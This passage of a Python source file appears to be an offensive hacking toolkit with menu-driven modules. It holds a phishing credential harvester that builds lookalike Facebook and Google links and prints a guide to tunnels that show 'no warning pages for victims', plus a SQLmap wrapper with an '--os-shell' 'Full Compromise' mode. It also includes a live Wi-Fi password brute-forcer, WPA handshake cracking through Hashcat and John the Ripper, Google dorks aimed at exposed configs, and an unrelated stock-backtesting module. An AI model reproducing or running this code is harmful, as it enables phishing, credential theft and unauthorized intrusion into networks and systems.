                if "Facebook" in selected_template_name: fake_domain = "fb-secure"
                elif "Google" in selected_template_name: fake_domain = "google-verify"
                elif "Instagram" in selected_template_name: fake_domain = "insta-login"
                
                short_url, custom_url = generate_masked_link(public_url, fake_domain)
                if short_url:
                    print(f"\n{Colors.GREEN}[SUCCESS] Links Generated!{Colors.RESET}")
                    print(f"{Colors.TEXT}    Primary Link: {Colors.BOLD}{short_url}{Colors.RESET}")
                    print(f"{Colors.ACCENT}    * Use this link to send to your target via Ngrok.{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[!] Failed to generate shortened link.{Colors.RESET}")

        print(f"\n{Colors.BLUE}=== PUBLIC ACCESS & WARNING BYPASS GUIDE ==={Colors.RESET}")
        print(f"{Colors.BLUE}  1. Verify it works locally: Open {Colors.WHITE}http://127.0.0.1:{port}{Colors.BLUE} in your browser.{Colors.RESET}")
        print(f"\n{Colors.PURPLE}  [ OPTION A: Warning-Free (Recommended) ]{Colors.RESET}")
        print(f"{Colors.WHITE}     - Use LocalXpose: {Colors.CYAN}loclx http --port {port}{Colors.RESET}")
        print(f"{Colors.WHITE}     - Use Cloudflare: {Colors.CYAN}cloudflared tunnel --url http://127.0.0.1:{port}{Colors.RESET}")
        print(f"{Colors.WHITE}     * These tools usually have NO warning pages for victims.{Colors.RESET}")
        
        print(f"\n{Colors.YELLOW}  [ OPTION B: Ngrok (Has Warning Pages) ]{Colors.RESET}")
        print(f"{Colors.WHITE}     - Run: {Colors.CYAN}ngrok http {port}{Colors.RESET}")
        print(f"{Colors.WHITE}     - Note: Victims MUST click 'Visit Site' on the warning page.{Colors.RESET}")
        print(f"{Colors.WHITE}     - Use the EXACT URL provided by Ngrok.{Colors.RESET}")
        
        print(f"\n{Colors.YELLOW}  - Press Ctrl+C in THIS terminal to stop the harvester.{Colors.RESET}")
        
        server_thread = threading.Thread(target=my_server.serve_forever)
        server_thread.daemon = True # Allow main program to exit even if server is running
        server_thread.start()

        while server_thread.is_alive():
            time.sleep(0.5)

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Harvester stopped by user.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error starting harvester: {e}{Colors.RESET}")
        if "Address already in use" in str(e):
            print(f"{Colors.RED}[!] Port {port} is already in use. Please choose a different port.{Colors.RESET}")
    finally:
        if my_server:
            print(f"{Colors.CYAN}[*] Shutting down server...{Colors.RESET}")
            my_server.shutdown()
            my_server.server_close()
        if server_thread and server_thread.is_alive():
            server_thread.join(timeout=1) # Give it a moment to shut down
        print(f"{Colors.CYAN}[*] Server stopped.{Colors.RESET}")

def phishing_menu():
    menu_map = {'1': ("Credential Harvester", credential_harvester_ui)}
    while True:
        try:
            display_banner()
            print(f"{Colors.BORDER}╔════[ {Colors.HEADER}PHISHING MODULES {Colors.BORDER}]════╗{Colors.RESET}\n")
            for key, (name, _) in menu_map.items(): 
                print(f"{Colors.BORDER}║ {Colors.ACCENT}[{key}]{Colors.TEXT} {name:<41} {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════════╣{Colors.RESET}")
            print(f"{Colors.BORDER}║ {Colors.ACCENT}[9]{Colors.TEXT} Return to Mainframe                     {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╚══════════════════════════════════════════════════╝{Colors.RESET}\n")
            choice = input(get_prompt())
            if choice in menu_map: menu_map[choice][1](); pause()
            elif choice == '9': return
            else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}[!] Operation Cancelled. Returning to Phishing Menu...{Colors.RESET}")
            time.sleep(1.5)


def financial_analysis_menu():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}FINANCIAL SIMULATOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    missing_libs = []
    if not all([YFINANCE_INSTALLED, PANDAS_INSTALLED, MATPLOTLIB_INSTALLED, NUMPY_INSTALLED]):
        print(f"{Colors.RED}[!] Missing libraries: yfinance, pandas, matplotlib, numpy.{Colors.RESET}")
        return

    ticker = get_validated_input("Stock ticker (e.g., AAPL)").upper()
    start_date = get_validated_input("Start date (YYYY-MM-DD)")
    end_date = get_validated_input("End date (YYYY-MM-DD)")
    
    # Basic date validation
    if not re.match(r"\d{4}-\d{2}-\d{2}", start_date) or not re.match(r"\d{4}-\d{2}-\d{2}", end_date):
        print(f"{Colors.RED}[!] Invalid date format. Use YYYY-MM-DD.{Colors.RESET}")
        return

    initial_capital = get_validated_input("Initial capital", float, default=10000.0)

    print(f"\n{Colors.ACCENT}[*] Fetching data for {ticker} from {start_date} to {end_date}...{Colors.RESET}")
    try:
        data = yf.download(ticker, start=start_date, end=end_date, progress=False)
        if data.empty:
            print(f"\n{Colors.RED}[!] No data found for ticker '{ticker}' in the given date range.{Colors.RESET}")
            return
    except Exception as e:
        print(f"\n{Colors.RED}[!] Failed to download data: {e}{Colors.RESET}")
        return

    # Simple Moving Average (SMA) Crossover Strategy
    short_window = 40
    long_window = 100
    
    print(f"{Colors.CYAN}[*] Applying SMA Crossover Strategy (Short: {short_window}, Long: {long_window})...{Colors.RESET}")

    signals = pd.DataFrame(index=data.index)
    signals['signal'] = 0.0
    signals['short_mavg'] = data['Close'].rolling(window=short_window, min_periods=1, center=False).mean()
    signals['long_mavg'] = data['Close'].rolling(window=long_window, min_periods=1, center=False).mean()

    signals.loc[short_window:, 'signal'] = np.where(signals['short_mavg'][short_window:] > signals['long_mavg'][short_window:], 1.0, 0.0)   
    signals['positions'] = signals['signal'].diff()

    # Backtesting
    positions = pd.DataFrame(index=signals.index).fillna(0.0)
    positions[ticker] = 100 * signals['signal']
  
    portfolio = positions.multiply(data['Adj Close'], axis=0)
    pos_diff = positions.diff()

    portfolio['holdings'] = (positions.multiply(data['Adj Close'], axis=0)).sum(axis=1)
    portfolio['cash'] = initial_capital - (pos_diff.multiply(data['Adj Close'], axis=0)).sum(axis=1).cumsum()
    portfolio['total'] = portfolio['cash'] + portfolio['holdings']
    portfolio['returns'] = portfolio['total'].pct_change()
    
    print("\n" + "="*70)
    print(f"{Colors.BOLD}Simulation Results:{Colors.RESET}")
    print(f"  - {Colors.WHITE}Initial Portfolio Value: ${initial_capital:,.2f}{Colors.RESET}")
    final_value = portfolio['total'].iloc[-1]
    print(f"  - {Colors.WHITE}Final Portfolio Value: ${final_value:,.2f}{Colors.RESET}")
    profit = final_value - initial_capital
    profit_color = Colors.GREEN if profit >= 0 else Colors.RED
    print(f"  - {Colors.WHITE}Total Profit/Loss: {profit_color}${profit:,.2f}{Colors.RESET}")
    returns = (final_value / initial_capital - 1) * 100
    print(f"  - {Colors.WHITE}Total Returns: {profit_color}{returns:.2f}%{Colors.RESET}")
    print("="*70)

    print(f"\n{Colors.ACCENT}[*] Generating plot... (Close the plot window to continue){Colors.RESET}")
    try:
        if os.environ.get('DISPLAY') is None and os.name != 'nt':
            print(f"\n{Colors.YELLOW}[!] No display found. Plotting skipped.{Colors.RESET}")
            return
            
        fig = plt.figure(figsize=(14, 8))
        ax1 = fig.add_subplot(111, ylabel='Price in $')
        data['Close'].plot(ax=ax1, color='c', lw=2., label='Close Price')
        signals[['short_mavg', 'long_mavg']].plot(ax=ax1, lw=2.)
        ax1.plot(signals.loc[signals.positions == 1.0].index, signals.short_mavg[signals.positions == 1.0], '^', markersize=12, color='g', label='Buy Signal')
        ax1.plot(signals.loc[signals.positions == -1.0].index, signals.short_mavg[signals.positions == -1.0], 'v', markersize=12, color='r', label='Sell Signal')
        plt.title(f"{ticker} SMA Crossover Strategy ({short_window}/{long_window})")
        plt.legend()
        plt.show()
    except Exception as e:
        print(f"\n{Colors.RED}[!] Could not display plot: {e}{Colors.RESET}")



# =================================================================================================
# OSINT MODULE
# =================================================================================================

def sherlock_lite_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}SHERLOCK LITE (USERNAME SEARCH) {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not REQUESTS_INSTALLED: print(f"{Colors.RED}[!] Requests library not found.{Colors.RESET}"); return
    
    username = get_validated_input("Target Username")
    print(f"\n{Colors.ACCENT}[*] Scanning popular platforms for '{username}'...{Colors.RESET}")
    print(f"{Colors.TEXT}    (Green = Found, Red = Not Found/Error){Colors.RESET}\n")
    
    # Platform list: (Name, URL Template, Check Logic)
    # Check Logic: 200 OK usually means found for these, 404 means not found.
    sites = [
        ("GitHub", f"https://github.com/{username}"),
        ("Instagram", f"https://www.instagram.com/{username}/"),
        ("Twitter (X)", f"https://twitter.com/{username}"),
        ("Facebook", f"https://www.facebook.com/{username}"),
        ("Reddit", f"https://www.reddit.com/user/{username}"),
        ("YouTube", f"https://www.youtube.com/@{username}"),
        ("Twitch", f"https://www.twitch.tv/{username}"),
        ("Pinterest", f"https://www.pinterest.com/{username}/"),
        ("Telegram", f"https://t.me/{username}"),
        ("Patreon", f"https://www.patreon.com/{username}"),
        ("GitLab", f"https://gitlab.com/{username}"),
        ("Medium", f"https://medium.com/@{username}"),
        ("TikTok", f"https://www.tiktok.com/@{username}"),
    ]
    
    found_count = 0
    
    # We use a session for headers
    sess = requests.Session()
    sess.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Sentinel-X/5.0'})
    
    stop_event = threading.Event()

    def check_site(site_data):
        if stop_event.is_set(): return None
        name, url = site_data
        try:
            r = sess.get(url, timeout=5)
            if r.status_code == 200:
                # Basic false positive checks could be added here
                return (name, url)
        except: pass
        return None

    try:
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_site = {executor.submit(check_site, site): site for site in sites}
            for future in as_completed(future_to_site):
                if stop_event.is_set(): break
                result = future.result()
                if result:
                    name, url = result
                    print(f"{Colors.GREEN}[+] {name:<12}: {url}{Colors.RESET}")
                    found_count += 1
                else:
                    # Optional: Print negatives? Usually clutter.
                    pass
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scan interrupted.{Colors.RESET}")
        stop_event.set()
        
    print(f"\n{Colors.BORDER}══════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.ACCENT}[*] Scan complete. Profiles found: {found_count}{Colors.RESET}")

def google_dorks_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}GOOGLE DORKS AUTOMATOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    domain = get_validated_input("Target Domain (e.g., example.com)")
    
    dorks = [
        ("Publicly Exposed Documents", f"site:{domain} ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv"),
        ("Directory Listing Vulnerabilities", f"site:{domain} intitle:index.of"),
        ("Configuration Files", f"site:{domain} ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ini | ext:env"),
        ("Database Files", f"site:{domain} ext:sql | ext:dbf | ext:mdb"),
        ("Log Files", f"site:{domain} ext:log"),
        ("Backup and Old Files", f"site:{domain} ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup"),
        ("Login Pages", f"site:{domain} inurl:login | inurl:signin | intitle:Login | intitle:\"sign in\" | inurl:auth"),
        ("SQL Errors", f"site:{domain} intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:\"Warning: pg_connect()\""),
        ("PHP Errors / Warnings", f"site:{domain} \"PHP Parse error\" | \"PHP Warning\" | \"PHP Error\""),
        ("Admin Portals", f"site:{domain} intext:admin | intext:login | intext:adminlogin | intext:cpanel | intext:webmin"),
    ]
    
    print(f"{Colors.TEXT}Select dorks to open in default browser:{Colors.RESET}\n")
    for i, (name, _) in enumerate(dorks):
        print(f" {Colors.ACCENT}[{i+1}]{Colors.TEXT} {name}{Colors.RESET}")
    print(f" {Colors.ACCENT}[A]{Colors.TEXT} Open ALL (Warning: Spammy){Colors.RESET}")
    print(f" {Colors.ACCENT}[B]{Colors.TEXT} Back to Menu{Colors.RESET}")

    choice = input(f"\n{get_prompt()}")
    
    import urllib.parse
    
    selected_dorks = []
    if choice.upper() == 'A':
        selected_dorks = dorks
    elif choice.isdigit() and 1 <= int(choice) <= len(dorks):
        selected_dorks = [dorks[int(choice)-1]]
    elif choice.upper() == 'B':
        return
    else:
        print(f"{Colors.RED}[!] Invalid selection.{Colors.RESET}"); return
        
    for name, query in selected_dorks:
        print(f"{Colors.GREEN}[*] Opening: {name}{Colors.RESET}")
        encoded_query = urllib.parse.quote(query)
        webbrowser.open(f"https://www.google.com/search?q={encoded_query}")
        time.sleep(0.5)

def osint_menu():
    menu_map = {
        '1': ("Sherlock Lite (Username Search)", sherlock_lite_ui),
        '2': ("Google Dorks Automator", google_dorks_ui),
        '3': ("Whois Lookup", whois_ui),
    }
    while True:
        try:
            display_banner()
            print(f"{Colors.BORDER}╔════[ {Colors.HEADER}OSINT & RECONNAISSANCE {Colors.BORDER}]════╗{Colors.RESET}\n")
            for key, (name, _) in menu_map.items(): 
                print(f"{Colors.BORDER}║ {Colors.ACCENT}[{key}]{Colors.TEXT} {name:<41} {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════════╣{Colors.RESET}")
            print(f"{Colors.BORDER}║ {Colors.ACCENT}[9]{Colors.TEXT} Return to Mainframe                     {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╚══════════════════════════════════════════════════╝{Colors.RESET}\n")
            choice = input(get_prompt())
            if choice in menu_map: menu_map[choice][1](); pause()
            elif choice == '9': return
            else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Returning...{Colors.RESET}"); time.sleep(1)

def cms_scanner_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}CMS FINGERPRINTER {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not REQUESTS_INSTALLED: print(f"{Colors.RED}[!] Requests library not found.{Colors.RESET}"); return
    url = get_validated_input("Target URL (e.g., http://example.com)").rstrip('/')
    print(f"\n{Colors.ACCENT}[*] Identifying CMS for {url}...{Colors.RESET}")
    signatures = {
        "WordPress": ["wp-content", "wp-includes", "wp-login.php", "generator\" content=\"WordPress"],
        "Joomla": ["/administrator/", "jumla", "generator\" content=\"Joomla"],
        "Drupal": ["/sites/default/files", "generator\" content=\"Drupal", "/core/"],
        "Magento": ["/skin/frontend/", "mage-translation-storage"],
        "Shopify": ["cdn.shopify.com", "myshopify.com"],
        "Wix": ["wix.com", "X-Wix-Request-Id"]
    }
    try:
        r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        content, headers = r.text, str(r.headers)
        detected = [cms for cms, sigs in signatures.items() if any(sig in content or sig in headers for sig in sigs)]
        if detected: print(f"{Colors.GREEN}[+] Detected CMS: {', '.join(detected)}{Colors.RESET}")
        else: print(f"{Colors.YELLOW}[!] No specific CMS detected using basic signatures.{Colors.RESET}")
        print(f"\n{Colors.ACCENT}[*] Checking common admin paths...{Colors.RESET}")
        admin_paths = ["/wp-login.php", "/administrator/", "/admin/", "/user/login", "/login.php", "/dashboard"]
        for path in admin_paths:
            try:
                code = requests.head(f"{url}{path}", timeout=3).status_code
                if code in [200, 301, 302, 401]: print(f"{Colors.GREEN}[+] Found Panel: {path} (Status: {code}){Colors.RESET}")
            except: pass
    except Exception as e: print(f"{Colors.RED}[!] Error reaching target: {e}{Colors.RESET}")

def sqlmap_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}SQLMAP AUTOMATOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    sqlmap_cmd = get_sqlmap_path()
    if not sqlmap_cmd:
        print(f"{Colors.RED}[!] SQLmap not found.{Colors.RESET}"); return
    print(f"{Colors.GREEN}[+] Using SQLmap: {sqlmap_cmd}{Colors.RESET}")
    url = get_validated_input("Target URL (Vulnerable Param)")
    print(f" {Colors.PURPLE}[1]{Colors.WHITE} Basic Auto-Pwn (--batch --dbs){Colors.RESET}\n {Colors.PURPLE}[2]{Colors.WHITE} Full Compromise (--os-shell){Colors.RESET}\n {Colors.PURPLE}[3]{Colors.WHITE} Custom Args{Colors.RESET}")
    choice = get_validated_input("Select Mode", valid_range=["1", "2", "3"])
    cmd_str = f"{sqlmap_cmd} -u \"{url}\""
    if choice == '1': cmd_str += " --batch --dbs --random-agent"
    elif choice == '2': cmd_str += " --batch --os-shell --random-agent"
    elif choice == '3': cmd_str += f" {get_validated_input('Enter arguments')}"
    print(f"\n{Colors.ACCENT}[*] Launching SQLmap...{Colors.RESET}")
    subprocess.run(cmd_str, shell=True)
        
def api_fuzzer_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}API ENDPOINT FUZZER {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not REQUESTS_INSTALLED: print(f"{Colors.RED}[!] Requests library not found.{Colors.RESET}"); return
    url = get_validated_input("Base URL (e.g., http://api.target.com)").rstrip('/')
    wordlist_path = get_validated_input("Wordlist path (empty for built-in)", required=False)
    targets = [ "api", "v1", "v2", "swagger", "docs", "users", "admin", "login", "auth", "health", "metrics", "debug", "test", "graphql", "oauth", "token" ]
    if wordlist_path and os.path.exists(wordlist_path):
        with open(wordlist_path, 'r', errors='ignore') as f: targets = [l.strip() for l in f if l.strip()]
    print(f"\n{Colors.ACCENT}[*] Fuzzing {len(targets)} endpoints on {url}...{Colors.RESET}")
    stop_event = threading.Event()
    def check_endpoint(endpoint):
        if stop_event.is_set(): return
        try:
            code = requests.get(f"{url}/{endpoint}", timeout=3).status_code
            if code in [200, 201, 301, 302, 401, 403, 500]: print(f"{Colors.GREEN}[+] Found: /{endpoint:<15} (Status: {code}){Colors.RESET}")
        except: pass
    try:
        with ThreadPoolExecutor(max_workers=20) as executor:
            for f in as_completed([executor.submit(check_endpoint, ep) for ep in targets]):
                if stop_event.is_set(): break
    except KeyboardInterrupt:
        stop_event.set(); print(f"\n{Colors.WARNING}[!] Fuzzing interrupted.{Colors.RESET}")

def web_recon_menu():
    menu_map = {
        '1': ("Subdomain Scanner", subdomain_scanner_ui),
        '2': ("Directory Buster", dir_buster_ui),
        '3': ("CMS Fingerprinter", cms_scanner_ui),
        '4': ("SQLmap Automator", sqlmap_ui),
        '5': ("API Fuzzer", api_fuzzer_ui),
        '6': ("Whois Lookup", whois_ui),
        '7': ("Vulnerability Scanner (XSS/SQLi)", vuln_scanner_ui)
    }
    while True:
        try:
            display_banner()
            print(f"{Colors.BORDER}╔════[ {Colors.HEADER}WEB RECONNAISSANCE {Colors.BORDER}]════╗{Colors.RESET}\n")
            for key, (name, _) in menu_map.items(): 
                print(f"{Colors.BORDER}║ {Colors.ACCENT}[{key}]{Colors.TEXT} {name:<41} {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════════╣{Colors.RESET}")
            print(f"{Colors.BORDER}║ {Colors.ACCENT}[9]{Colors.TEXT} Return to Mainframe                     {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╚══════════════════════════════════════════════════╝{Colors.RESET}\n")
            choice = input(get_prompt())
            if choice in menu_map: menu_map[choice][1](); pause()
            elif choice == '9': return
            else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}[!] Operation Cancelled. Returning to Web Recon Menu...{Colors.RESET}")
            time.sleep(1.5)

def live_wifi_brute_force_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}LIVE WI-FI BRUTE-FORCER {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not PYWIFI_INSTALLED:
        print(f"{Colors.RED}[!] pywifi library not found. Run 'pip install pywifi' etc.{Colors.RESET}{PYWIFI_ERROR if PYWIFI_ERROR else ''}")
        return

    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]
    except Exception:
        print(f"{Colors.RED}[!] No Wi-Fi interface found. Ensure Wi-Fi is enabled.{Colors.RESET}"); return

    print(f"{Colors.ACCENT}[*] Scanning for nearby networks...{Colors.RESET}")
    iface.scan()
    time.sleep(2)
    results = iface.scan_results()
    
    if not results:
        print(f"{Colors.RED}[!] No Wi-Fi networks found. Ensure your Wi-Fi is turned on.{Colors.RESET}")
        return

    print(f"\n{Colors.HEADER}Available Networks:{Colors.RESET}")
    for i, network in enumerate(results):
        print(f" {Colors.ACCENT}[{i}]{Colors.TEXT} SSID: {network.ssid} (Signal: {network.signal}){Colors.RESET}")
    
    choice = get_validated_input("Select target Wi-Fi index", int, valid_range=range(0, len(results)))
    target_ssid = results[choice].ssid
    
    wordlist = get_validated_input("Path to Wordlist (Default: passwords.txt)", default="passwords.txt")
    if not os.path.exists(wordlist):
        print(f"{Colors.RED}[!] Wordlist not found: {wordlist}{Colors.RESET}"); return

    print(f"\n{Colors.ACCENT}[*] Attempting to crack {target_ssid}...{Colors.RESET}")
    try:
        with open(wordlist, 'r', errors='ignore') as f:
            for password in f:
                password = password.strip()
                if len(password) < 8: continue
                
                sys.stdout.write(f"\r{Colors.TEXT}[*] Testing: {password:<20}{Colors.RESET}")
                sys.stdout.flush()
                
                profile = pywifi.Profile()
                profile.ssid = target_ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                profile.key = password
                
                iface.remove_all_network_profiles()
                tmp_profile = iface.add_network_profile(profile)
                iface.connect(tmp_profile)
                
                start_time = time.time()
                found = False
                while time.time() - start_time < 2.5:
                    if iface.status() == const.IFACE_CONNECTED:
                        found = True; break
                    time.sleep(0.1)
                
                if found:
                    print(f"\n{Colors.GREEN}[SUCCESS] Password Found: {password}{Colors.RESET}"); return
                else:
                    iface.disconnect()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Wi-Fi cracking interrupted by operator.{Colors.RESET}")
        iface.disconnect()
    print(f"\n{Colors.RED}[!] Attack finished. No password found.{Colors.RESET}")

def get_aircrack_path(binary_name):
    """Helper to find Aircrack-ng binaries robustly."""
    # 1. Check local directory (common for portable installs)
    possible_local_dirs = [
        "aircrack-ng-1.7-win/bin",
        "aircrack-ng/bin",
        "bin"
    ]
    for d in possible_local_dirs:
        local_path = os.path.join(os.getcwd(), d, f"{binary_name}.exe")
        if os.path.exists(local_path):
            return local_path
            
    # 2. Check system PATH
    import shutil
    if path_in_env := shutil.which(binary_name):
        return path_in_env
        
    return None

def get_hashcat_path(binary_name="hashcat"):
    """Helper to find Hashcat binaries."""
    possible_local_dirs = ["hashcat", "hashcat-6.2.6", "bin"]
    for d in possible_local_dirs:
        potential_exe = os.path.join(os.getcwd(), d, f"{binary_name}.exe" if os.name == 'nt' else binary_name)
        if os.path.exists(potential_exe): return potential_exe
    import shutil
    if path_in_env := shutil.which(binary_name): return path_in_env
    return None

def hashcat_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}HASHCAT GPU CRACKER {Colors.BORDER}]══╗{Colors.RESET}\n")
    hc_path = get_hashcat_path()
    if not hc_path: print(f"{Colors.RED}[!] Hashcat not found.{Colors.RESET}"); return
    
    print(f"{Colors.GREEN}[+] Found Hashcat: {hc_path}{Colors.RESET}")
    hash_file = get_validated_input("Path to Hash File")
    if not os.path.exists(hash_file): print(f"{Colors.RED}[!] File not found.{Colors.RESET}"); return
    
    wordlist = get_validated_input("Path to Wordlist", default="passwords.txt")
    print(f" {Colors.PURPLE}[1]{Colors.WHITE} MD5 (0)\n {Colors.PURPLE}[2]{Colors.WHITE} SHA256 (1400)\n {Colors.PURPLE}[3]{Colors.WHITE} WPA/WPA2 (22000 / 2500 / 16800)")
    mode_choice = get_validated_input("Select Hash Type", valid_range=["1", "2", "3"])
    
    mode_map = {'1': '0', '2': '1400', '3': '22000'}
    m = mode_map[mode_choice]
    
    if mode_choice == '3':
        print(f"{Colors.TEXT}Ensure your capture is in .hc22000 (recommended) or .hccapx format.{Colors.RESET}")
        
    cmd = [hc_path, '-m', m, '-a', '0', hash_file, wordlist]
    print(f"\n{Colors.ACCENT}[*] Initializing GPU Crack... (Ctrl+C to stop){Colors.RESET}")
    try: subprocess.run(cmd)
    except KeyboardInterrupt: print(f"\n{Colors.WARNING}[!] Hashcat interrupted.{Colors.RESET}")

def get_john_path(binary_name="john"):
    """Helper to find John the Ripper binaries."""
    # 1. Check local directory (Jumbo build structure)
    possible_local_dirs = [
        "john/run",
        "john-1.9.0-jumbo-1-win64/run",
        "run"
    ]
    for d in possible_local_dirs:
        local_path = os.path.join(os.getcwd(), d, f"{binary_name}.exe" if os.name == 'nt' else binary_name)
        if os.path.exists(local_path):
            return local_path
            
    # 2. Check system PATH
    import shutil
    if path_in_env := shutil.which(binary_name):
        return path_in_env
        
    return None

def get_sqlmap_path(binary_name="sqlmap"):
    """Helper to find SQLmap binaries."""
    possible_local_dirs = ["sqlmap", "sqlmap-dev", "bin"]
    for d in possible_local_dirs:
        potential_py = os.path.join(os.getcwd(), d, "sqlmap.py")
        if os.path.exists(potential_py): return f"python {potential_py}"
        potential_exe = os.path.join(os.getcwd(), d, "sqlmap.exe")
        if os.path.exists(potential_exe): return potential_exe
    import shutil
    if path_in_env := shutil.which(binary_name): return path_in_env
    return None

def wifi_handshake_cracker_john_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}WI-FI HANDSHAKE CRACKER (JtR) {Colors.BORDER}]══╗{Colors.RESET}\n")
    
    john_path = get_john_path("john")
    converter_path = get_john_path("wpapcap2john")
    
    if not john_path:
        print(f"{Colors.RED}[!] John the Ripper binary not found.{Colors.RESET}"); return
        
    # Converter might have a specific name or be in the same dir
    if not converter_path:
        # Fallback: try to guess based on john_path
        base_dir = os.path.dirname(john_path)
        potential = os.path.join(base_dir, "wpapcap2john.exe" if os.name == 'nt' else "wpapcap2john")
        if os.path.exists(potential): converter_path = potential
        
    if not converter_path:
        print(f"{Colors.YELLOW}[!] 'wpapcap2john' tool not found. Cannot convert .cap files directly.{Colors.RESET}")
        print(f"{Colors.TEXT}    Please ensure it is in the same directory as 'john'.{Colors.RESET}")
        return

    print(f"{Colors.GREEN}[+] Found JtR Suite at: {os.path.dirname(john_path)}{Colors.RESET}")
    
    cap_file = get_validated_input("Path to .cap / .pcap handshake file")
    if not os.path.exists(cap_file):
        print(f"{Colors.RED}[!] File not found.{Colors.RESET}"); return

    wordlist = get_validated_input("Path to Wordlist", default="passwords.txt")
    if not os.path.exists(wordlist):
        print(f"{Colors.RED}[!] Wordlist not found.{Colors.RESET}"); return
        
    hash_file = output_file = f"{cap_file}.john"
    print(f"\n{Colors.ACCENT}[*] Converting capture file to JtR format...{Colors.RESET}")
    
    try:
        # wpapcap2john <pcap> > <hashfile> (we need to handle stdout redir manually)
        with open(hash_file, "w") as outfile:
            subprocess.run([converter_path, cap_file], stdout=outfile, stderr=subprocess.PIPE, check=True)
        print(f"{Colors.GREEN}[+] Conversion successful: {hash_file}{Colors.RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{Colors.RED}[!] Conversion failed.{Colors.RESET}"); return
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}"); return

    print(f"\n{Colors.ACCENT}[*] Launching John the Ripper on Wi-Fi hash...{Colors.RESET}")
    cmd = [john_path, "--format=wpapsk", f"--wordlist={wordlist}", hash_file]
    print(f"{Colors.TEXT}    Command: {' '.join(cmd)}{Colors.RESET}\n")

    try:
        subprocess.run(cmd)
        print(f"\n{Colors.GREEN}[*] Attack finished. Checking results...{Colors.RESET}")
        subprocess.run([john_path, "--show", "--format=wpapsk", hash_file])
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Interrupted by user.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during cracking: {e}{Colors.RESET}")


def bt_discovery_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}BLUETOOTH / BLE DISCOVERY {Colors.BORDER}]══╗{Colors.RESET}\n")
    print(f"{Colors.ACCENT}[*] Initializing Bluetooth scan...{Colors.RESET}")
    if os.name != 'nt':
         try:
            print(f"{Colors.TEXT}Running 'hcitool scan'...{Colors.RESET}")
            subprocess.run(['hcitool', 'scan'])
         except:
            print(f"{Colors.RED}[!] hcitool not found. Ensure BlueZ is installed.{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}[!] Native Bluetooth scanning is limited on Windows via Python.{Colors.RESET}")
        print(f"{Colors.TEXT}    Recommendation: Use 'BluetoothView' for deep analysis.{Colors.RESET}")

def wifite_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}WIFITE2 AUTOMATED AUDITOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    import shutil
    wifite_path = shutil.which("wifite")
    if not wifite_path: print(f"{Colors.RED}[!] Wifite2 not found in system PATH.{Colors.RESET}"); return
    print(f"{Colors.TEXT}Starting Wifite2... Requires Root/Monitor mode.{Colors.RESET}")
    try: subprocess.run(['sudo', wifite_path] if os.name != 'nt' else [wifite_path])
    except KeyboardInterrupt: print(f"\n{Colors.WARNING}[!] Wifite stopped.{Colors.RESET}")

def airgeddon_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}AIRGEDDON WIRELESS SUITE {Colors.BORDER}]══╗{Colors.RESET}\n")
    import shutil
